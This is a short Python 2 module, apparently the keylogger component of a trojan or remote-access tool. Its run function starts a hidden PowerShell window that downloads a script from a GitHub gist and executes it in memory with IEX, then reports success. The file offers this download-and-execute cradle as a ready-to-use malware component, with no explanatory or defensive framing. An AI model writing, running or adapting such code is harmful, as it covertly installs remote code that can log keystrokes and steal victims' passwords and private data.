from subprocess import *


def run(**args):
    print "[*] In Keylogger module."
    Popen(
        "powershell -windowstyle hidden -c IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/dasgoll/7ca1c059dd3b3fbc7277/raw/e4e3a530589dac67ab6c4c2428ea90de93b86018/gistfile1.txt');")
    return "Success" 
